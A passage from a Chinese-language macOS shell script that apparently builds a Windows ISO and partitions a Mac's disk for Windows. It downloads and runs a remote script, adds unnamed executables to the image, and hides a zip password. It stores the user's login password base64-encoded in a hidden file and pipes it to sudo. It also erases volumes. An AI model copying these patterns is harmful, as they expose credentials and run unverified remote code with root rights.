unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
fi

if [ "$uups" ];then
rm /tmp/convert.sh >/dev/null 2>&1
/tmp/aria2c -c -s25 -x16 -m0 -o convert.sh --console-log-level=warn --summary-interval=888888888 $ip5/convert7.sh -d /tmp
if [ "$isovm" ];then
/tmp/aria2c -c -s25 -x16 -m0 -o 11.reg --console-log-level=warn --summary-interval=888888888 $ip5/1.reg -d /tmp
fi
chmod a+x /tmp/convert.sh
/tmp/aria2c -c -s25 -x16 -m0 -o uupsoft.zip --console-log-level=warn --summary-interval=888888888 "$ip5/uupsoft.zip" -d /tmp
unzip -o "/tmp/uupsoft.zip" -d "/tmp">/dev/null 2>&1
if [ "$xtyh" ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o yxk.exe --console-log-level=warn --summary-interval=888888888 $ip5/yxk.exe -d /tmp/uupsoft/Windows
/tmp/aria2c -c -s25 -x16 -m0 -o act.exe --console-log-level=warn --summary-interval=888888888 $ip5/act.exe -d /tmp/uupsoft/Windows
#rm -rf /tmp/uupsoft/Windows/soft.exe
#/tmp/aria2c -c -s25 -x16 -m0 -o soft.exe --console-log-level=warn --summary-interval=888888888 $ip5/soft.exe -d /tmp/uupsoft/Windows
fi
if [ "$isovm" ];then
rm -rf /tmp/uupsoft/Windows/Panther/Unattend.xml
/tmp/aria2c -c -s25 -x16 -m0 -o Unattend.xml --console-log-level=warn --summary-interval=888888888 $osip/vmu.xml -d /tmp/uupsoft/Windows/Panther	
mkdir -p /tmp/uupsoft/Windows/vmarm
hdiutil attach ~/Downloads/JG_Download/VMware-Fusion-13.0.1-21139760_universal.dmg >/dev/null 2>&1 
hdiutil attach /Volumes/VMware\ Fusion/VMware\ Fusion.app/Contents/Library/isoimages/arm64/windows.iso >/dev/null 2>&1
cp -R /Volumes/VMware\ Tools/* /tmp/uupsoft/Windows/vmarm
umount -f /Volumes/VMware\ Fusion
umount -f /Volumes/VMware\ Tools
diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
diskutil eject $(diskutil list | grep 'VMware Tools' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi
if [ "$m1w10" ];then
/tmp/aria2c -c -s25 -x16 -m0 -o WDC.exe --console-log-level=warn --summary-interval=888888888 $ip5/WDC.exe -d /tmp/uupsoft/Windows
fi

echo $isoName >/tmp/ISO.txt

clear && printf "\e[3J"
/tmp/convert.sh esd "$destDir" 0
#echo "$pass" | sudo -S sudo bash /tmp/convert.sh esd "$destDir" 0



else
if [ ! -f ~/Downloads/JG_Download/"$isoName".iso ]; then
if [ ! -f $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o isore.zip --console-log-level=warn --summary-interval=888888888 $ip5/isore.zip -d /tmp
unzip -o "/tmp/isore.zip" -d "/tmp">/dev/null 2>&1
/tmp/aria2c -c -s25 -x16 -m0 -o uupsoft.zip --console-log-level=warn --summary-interval=888888888 $ip5/uupsoft.zip -d /tmp
unzip -o "/tmp/uupsoft.zip" -d "/tmp">/dev/null 2>&1
if [ "$xtyh" ]; then
/tmp/aria2c -c -s25 -x16 -m0 -o yxk.exe --console-log-level=warn --summary-interval=888888888 $ip5/yxk.exe -d /tmp/uupsoft/Windows
/tmp/aria2c -c -s25 -x16 -m0 -o act.exe --console-log-level=warn --summary-interval=888888888 $ip5/act.exe -d /tmp/uupsoft/Windows
#rm -rf /tmp/uupsoft/Windows/soft.exe
#/tmp/aria2c -c -s25 -x16 -m0 -o soft.exe --console-log-level=warn --summary-interval=888888888 $ip5/soft.exe -d /tmp/uupsoft/Windows
fi
if [ "$isovm" ];then
rm -rf /tmp/uupsoft/Windows/Panther/Unattend.xml
/tmp/aria2c -c -s25 -x16 -m0 -o Unattend.xml --console-log-level=warn --summary-interval=888888888 $osip/vmu.xml -d /tmp/uupsoft/Windows/Panther
mkdir -p /tmp/uupsoft/Windows/vmarm
hdiutil attach ~/Downloads/JG_Download/VMware-Fusion-13.0.1-21139760_universal.dmg >/dev/null 2>&1 
hdiutil attach /Volumes/VMware\ Fusion/VMware\ Fusion.app/Contents/Library/isoimages/arm64/windows.iso >/dev/null 2>&1
cp -R /Volumes/VMware\ Tools/* /tmp/uupsoft/Windows/vmarm
umount -f /Volumes/VMware\ Fusion
umount -f /Volumes/VMware\ Tools
diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
diskutil eject $(diskutil list | grep 'VMware Tools' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi
clear && printf "\e[3J"
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex apply ~/Downloads/JG_Download/$xtname 1 $HOME/Downloads/JG_Download/ISODIR --no-acls --no-attributes 2>/dev/null
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$xtname 2 $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim \
  --compress=maximum --boot
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$xtname 3 \
  $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex info $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim 2 --image-property FLAGS=2 >/dev/null
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex info $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim 2 --boot >/dev/null
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update $HOME/Downloads/JG_Download/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/isore /"
fi
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimexport ~/Downloads/JG_Download/$xtname $index $HOME/Downloads/JG_Download/ISODIR/sources/install.wim
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update $HOME/Downloads/JG_Download/ISODIR/sources/install.wim \
    --command "add /tmp/uupsoft /"
echo "$pass" | sudo -S sudo /tmp/"$iso" -b "efi/microsoft/boot/efisys.bin" --no-emul-boot \
    --udf -iso-level 3 --hide "*" -V "Win" -o ~/Downloads/JG_Download/"$isoName".iso $HOME/Downloads/JG_Download/ISODIR
echo "$pass" | sudo -S sudo rm -rf $HOME/Downloads/JG_Download/ISODIR
fi
fi


if [ ! -f ~/Downloads/JG_Download/"$isoName".iso ]; then
clear && printf "\e[3J"	
echo
echo
read -s -n1 -p "无法制作ISO镜像，让任意键重试！"
ISO
fi

if [ "$pd18sq" ];then
M1Arm
fi

if [ "$pd17sq" ];then
M1Arm
fi

if [ "$pd16sq" ];then
M1Arm
fi

if [ "$azvmxnj" ];then
M1Arm
fi


if [ "$xnjaz" ];then
if [ -f ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg ]; then
M1Arm
else
if [ -f ~/Downloads/JG_Download/VMware-Fusion*.dmg ]; then
M1Arm
else
clear && printf "\e[3J"	
echo
echo
read -s -n1 -p "检测不到虚拟机安装包，任意键返回"
Start_menu
fi
fi
fi


clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo
read -s -n1 -p "制作完成！！！任意键返回"
Customize
}


FenQu2(){
#osascript -e 'quit app"System Preferences"'
#open /Library/PreferencePanes/Tuxera\ NTFS.prefPane
#open /Library/PreferencePanes/NTFSforMacOSX.prefPane
#open /Library/PreferencePanes/ParagonNTFS.prefPane
#open /Applications/Paragon\ NTFS\ for\ Mac\ 15.app
#open /Applications/Paragon\ NTFS\ for\ Mac.app
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi

jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi


apfs_active=`diskutil list | grep Apple_APFS`

if [ ! "$iMacbb" ] ; then
if [ "$apfs_active" ] ; then
if [[ $modelxh = "10.13"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
else
if [[ $modelxh = "10.13"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk0s2"
fi
fi
fi
fi
fi

echo
echo

if [ -f ~/abcd.sh ] ; then
source ~/abcd.sh
if [[ $modelxh != "10.6"* ]]; then
pass=$(echo $pass | base64 -D)
fi
fi

if [ ! "$oldusb" ]; then
if [ ! "$pass" ]; then
pass="$(osascript -e 'set pass to text returned of (display dialog "请输入您当前苹果系统的开机密码:" default answer "" buttons {"OK"} default button 1 with hidden answer)')"
osascript <<EOD
activate application "Terminal"
EOD
password="$pass"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请先修改密码！"
FenQu2
fi
else
if [[ $modelxh = "10.6"* ]]; then
echo
else
if [ ! "$pass" ]; then
pass="$(osascript -e 'Tell application "System Events" to display dialog "请输入您当前苹果系统的开机密码:" buttons {"OK"} default button 1 with hidden answer default answer ""' -e 'text returned of result')"
password="$pass"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请先修改密码！"
FenQu2
fi
fi
fi
if [ ! "$pass" ]; then
unset password
prompt="输入苹果系统开机的密码:"
while IFS= read -p"$prompt" -r -s -n 1 char
do
    if [[ $char == $'\0' ]]
    then
        break
    fi
    prompt='*'
    password+="$char"
done
echo
pass="$password"
fi
if [[ $password = "x" ]]; then
password=""
pass=""
Customize
fi
if [[ $password = "X" ]]; then
password=""
pass=""
Customize
fi
#if [[ $password = "w" ]]; then
#dscl . passwd $HOME "" 1234
#pass="1234"
#password="1234"
#fi
#if [[ $password = "W" ]]; then
#dscl . passwd $HOME "" 1234
#pass="1234"
#password="1234"
#fi
passwrd=`echo "$pass" | sudo -S sudo su`
if [ $? -eq 1 ] ; then
pass=""
if [ -f ~/abcd.sh ] ; then
rm -rf ~/abcd.sh
fi
if [[ $password = "root" ]]; then
clear && printf "\e[3J"
echo 
echo "启用：备用模式"
moderoot="1"
password=""
pass=""
echo
echo
read -p "开机密码==锁屏密码

如果【输入错会弹出密码窗口】，请【取消】在【此窗口】重新输入密码

请输入您当前苹果系统开机的密码并回车[Enter]：" pass
osascript <<EOD
do shell script "" password "$pass" with administrator privileges
EOD
if [ $? -eq 1 ] ; then
password="root"
moderoot=""
pass=""
FenQu2
fi
else
if [ ! "$moderoot" ]; then
clear && printf "\e[3J"
echo
echo
read -t 2 -p "密码错误！！！"
FenQu2
fi
fi
fi

if [ "$moderoot" ]; then
echo
else
if [ ! -f ~/abcd.sh ] ; then
echo "#!/bin/sh" > ~/abcd.sh
if [[ $modelxh != "10.6"* ]]; then
echo pass=$(echo $password | base64) >> ~/abcd.sh
fi
chflags hidden ~/abcd.sh
fi
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "pmset -a displaysleep 0 disksleep 0 sleep 0" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo pmset -a displaysleep 0 disksleep 0 sleep 0
fi
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
	echo "\033[36m检查系统总分区位置\033[0m"
	diskutil list /dev/disk0
	diskutil list /dev/disk"${devboot:4:1}"
    echo
echo "启动盘为：$macboot""$devboot"
osascript <<EOD
activate application "Terminal"
EOD
echo
win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
if [ "${win_partition}" ] ; then
devboot=""
echo "检测到存在Win系统分区"
restore_device="/dev/${win_partition}"
echo "$restore_device"
if [ $(echo "$restore_device" | wc -l ) -gt 1 ]; then
echo "检测到存在多个Win系统分区，请手动选择磁盘，按任意键继续 ... "
clear && printf "\e[3J"
echo "\033[36m选择需要安装的分区\033[0m"
echo 
diskutil list | grep 'Microsoft Basic Data'
echo 
read -p "输入系统总分区位置:" num
case "$num" in
	x)
	Start_menu
	;;
esac
if [ ! "$num" ]; then
FenQu2
fi
echo
read -p "输入系统子分区位置:" num2
case "$num2" in
	x)
	Start_menu
	;;
esac
if [ ! "$num2" ]; then
FenQu2
fi
restore_device="/dev/disk"$num"s"$num2""
pdfq=$(diskutil list | grep "disk"$num"s"$num2"" | grep 'Microsoft Basic Data')
if [ ! "$pdfq" ]; then
FenQu2
fi
wzyp=$(diskutil list "disk"$num"s"$num2"" | grep 'external')
#Downloadzxc
FenQu3
fi
devboot=$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)
if [ ! "$devboot" ]; then
devboot=$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 3 | tail -n 1)
fi
if [ "${win_partition:4:1}" = "0" ] || [ "${win_partition:4:1}" = "${devboot:4:1}" ] ; then
read -s -n1 -p "按任意键继续 ... "
#Downloadzxc
FenQu3
else
echo
read -s -n1 -p "安装分区和主分区不一致，按任意键继续 ..."
devboot=""
fi
fi
echo
if [ "$devboot" ]; then
num="${devboot:4:1}"
num2="${devboot:6:1}"
else
clear && printf "\e[3J"
	echo "\033[36m检查系统总分区位置\033[0m"
	diskutil list
echo	
read -p "输入系统总分区位置:" num
case "$num" in
	x)
	Start_menu
	;;
esac
if [ ! "$num" ]; then
FenQu2
fi
win_partition=$(diskutil list disk"$num" | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
if [ "${win_partition}" ] ; then
echo "检测到存在Win系统分区"
restore_device="/dev/${win_partition}"
echo "$restore_device"
if [ $(echo "$restore_device" | wc -l ) -gt 1 ]; then
echo "检测到存在多个Win系统分区，请手动选择磁盘，按任意键继续 ... "
clear && printf "\e[3J"
echo "\033[36m选择需要安装的分区\033[0m"
echo 
diskutil list | grep 'Microsoft Basic Data'
echo 
read -p "输入系统总分区位置:" num
case "$num" in
	x)
	Start_menu
	;;
esac
if [ ! "$num" ]; then
FenQu2
fi
echo
read -p "输入系统子分区位置:" num2
case "$num2" in
	x)
	Start_menu
	;;
esac
if [ ! "$num2" ]; then
FenQu2
fi
restore_device="/dev/disk"$num"s"$num2""
pdfq=$(diskutil list | grep "disk"$num"s"$num2"" | grep 'Microsoft Basic Data')
if [ ! "$pdfq" ]; then
FenQu2
fi
#Downloadzxc
FenQu3
fi
read -s -n1 -p "按任意键继续 ... "
#Downloadzxc
FenQu3
fi
echo
read -p "输入系统子分区位置:" num2
case "$num2" in
	x)
	Start_menu
	;;
esac
if [ ! "$num2" ]; then
FenQu2
fi
fi
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')[总]"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')[可用]"
kykj="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/[^0-9]//g')"
sjkykj="$(($kykj-7))"
if [ -f ~/Downloads/JG_Download/$name ]; then
sjkykj="$(($kykj-2))"
fi
tbky="$(df -h | head -2 | tail -1 | grep Ti)"
Disk="$disk_used / $disk_total"
echo
echo
echo "\033[42;30m 磁盘空间：${Disk}                                                   \033[0m"
echo
read -p "输入Windows分区大小:" num3
case "$num3" in
	x)
	XTLB
	;;
esac
if [ ! "$num3" ]; then
FenQu2
fi
if [ "$num3" = "0" ]; then
Customize
fi
pdzm=$(echo "$num3" | grep "[a-zA-Z]")
if [ "$pdzm" ]; then
FenQu2
fi
if [ "$num3" -lt 30 ]; then
echo
read -s -n1 -p "低于30G，按任意键继续..."
FenQu2
fi
if [ ! "$tbky" ]; then
if [ "$num3" -gt "$sjkykj" ]; then
echo
read -s -n1 -p "最大可以分"$sjkykj"G, 按任意键继续..."
FenQu2
fi
fi
if [ ! "$ddfq" ]; then
xcdx="$(($sjkykj-$num3))"
if [ "$xcdx" -ge 300 ]; then
echo
read -s -n1 -p "提醒：输入大小"$num3"G与可最大可分空间"$sjkykj"G相差大于300G"
fi
fi
size=$num3"000000000"
new_hfs_size="$(($hfs_size-$size))b"
 
if [ "$ddfq" ]; then 
FenQu4
fi

#Downloadzxc
FenQu3
}


FenQu4(){
clear && printf "\e[3J" 
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo "\033[42;30m 总共给Windows分"$num3"G                                                       \033[0m"
echo
read -p "输入Windows-C盘大小:" num4
if [ "$num4" -lt 35 ]; then
echo
read -s -n1 -p "注意至少35G！！！"
FenQu4
fi
if [ ! "$num4" ]; then
FenQu4
fi
if [ "$num4" = "0" ]; then
XTLB
fi
pdzm=$(echo "$num4" | grep "[a-zA-Z]")
if [ "$pdzm" ]; then
FenQu4
fi
csize=$num4"000000000"b
FenQu3
}


FenQu3(){
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "pmset -a displaysleep 0 disksleep 0 sleep 0" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo pmset -a displaysleep 0 disksleep 0 sleep 0
fi	
clear && printf "\e[3J"
	if [ "${win_partition}" ] ; then
	#Winxt
	Downloadzxc
	fi
echo	
##echo TeamViewerID: "\033[36m${TVID}\033[0m"	
echo
if [ "$ycmmaz" ]; then
echo 注意: "\033[36m正常安装中，此画面停留时间较长，请您耐心等待...\033[0m"	
else
echo ID: "\033[36m${tbid}\033[0m"		
fi
echo
apfs_active=0
is_apfs=`diskutil info disk"$num"s"$num2" | grep apfs`
if [ $? -eq 0 ] ; then
echo "硬盘格式为：APFS"
apfs_active=1
fi
core_storage_active=0
echo "检查核心存储....."
is_core_storage=`diskutil cs info disk"$num"s"$num2"`
if [ $? -eq 0 ] ; then
echo "所选卷是核心存储"
core_storage_active=1
fi
if [ $core_storage_active -eq 1 ]; then
echo "有核心存储，正在检查"
DISKFOUND=`diskutil cs list|grep 'CoreStorage logical volume groups'|sed "s|.*(\(.*\) found.*|\1|"`
if [ $DISKFOUND != "1" ]; then
echo "超过1个cs组，不支持，退出执行"
exit -1
fi
fi

is_core_storage=`diskutil list | grep Apple_CoreStorage`
if [ $? -eq 0 ] ; then
echo "所选卷是核心存储"
core_storage_active=1
fi


if [ $core_storage_active == 1  ] ; then
echo "从核心存储创建中..."
is_core_storage=`diskutil cs info disk"$num"`

if [ $? -eq 1 ] ; then
echo "所选卷不为核心存储，将更改为卷壹继续"
num="1"
fi

is_core_storage=`diskutil cs info disk"$num"`

if [ $? -eq 1 ] ; then
echo "卷壹不为核心存储，将更改为卷贰继续"
num="2"	
fi

echo 正在操作中CSA....需要较长时间....耐心等待即可....

if [ "$PEDrv" ] ; then
if [ ! "$MBR10" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.10"* ]]; then
echo 正在操作中HFS....需要较长时间....耐心等待即可...
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
else
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
diskutil eraseVolume JHFS+ DOS $restore_device
hfs_size=`diskutil info -plist $restore_device |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
new_hfs_size="$(($hfs_size-7000000000))b"
diskutil resizeVolume $restore_device "${new_hfs_size}" MS-DOS PEVIP 0b
if [ ! -e /Volumes/PEVIP ]; then
clear && printf "\e[3J"	
echo
echo "$restore_device"
echo "${new_hfs_size}"
echo
diskutil list
echo
read -s -n1 -p "无法创建PEVIP分区，请通知技术员！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
diskutil eraseVolume MS-DOS DOS $restore_device
#Winxt
Downloadzxc
fi
fi
fi
fi

if [ "$PEDrv" ] ; then
if [ ! "$MBR10" ]; then
if [ "$sip" ]; then
if [[ $modelxh = "10.11"* ]]; then
echo 正在操作中HFS....需要较长时间....耐心等待即可...
REHD="$(diskutil list | grep Apple_Boot)"
if [ "$REHD" ]; then
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
else
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Recovery 100MB JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
fi
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
diskutil eraseVolume JHFS+ DOS $restore_device
hfs_size=`diskutil info -plist $restore_device |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
new_hfs_size="$(($hfs_size-7000000000))b"
diskutil resizeVolume $restore_device "${new_hfs_size}" MS-DOS PEVIP 0b
if [ ! -e /Volumes/PEVIP ]; then
clear && printf "\e[3J"	
echo
echo "$restore_device"
echo "${new_hfs_size}"
echo
diskutil list
echo
read -s -n1 -p "无法创建PEVIP分区，请通知技术员！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
diskutil eraseVolume MS-DOS DOS $restore_device
#Winxt
Downloadzxc
fi
fi
fi
fi

if [[ $modelxh = "10.11"* ]]; then
if [ ! "$sip" ] ; then
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
else
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi
fi
if [[ $modelxh = "10.12"* ]]; then
if [ ! "$sip" ] ; then
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！10.12"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
else
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
#curl --connect-timeout 10 -T /tmp/fqsb.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
#rm -rf /tmp/fqsb.txt
#read -s -n1 -p "分区失败，请手动检查！"
#open /System/Applications/Utilities/Disk\ Utility.app 	
#open /Applications/Utilities/Disk\ Utility.app
#Start_menu
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！10.12SIP"
exit
fi
if [ "$ddfq" ]; then 
diskutil eraseVolume JHFS+ DOS $restore_device
diskutil resizeVolume $restore_device "${csize}" ExFAT D 0b
diskutil eraseVolume MS-DOS DOS $restore_device
fi
restore_device="/dev/${restore_device}"
echo "已完成分区，安装分区为：${restore_device}"
#Winxt
Downloadzxc
fi
fi
if [[ $modelxh = "10.13"* ]]; then
if [ ! "$sip" ] ; then
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" MS-DOS DOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ -z "$restore_device" ] ; then
#echo "AZxx=分区失败" > /tmp/fqsb.txt
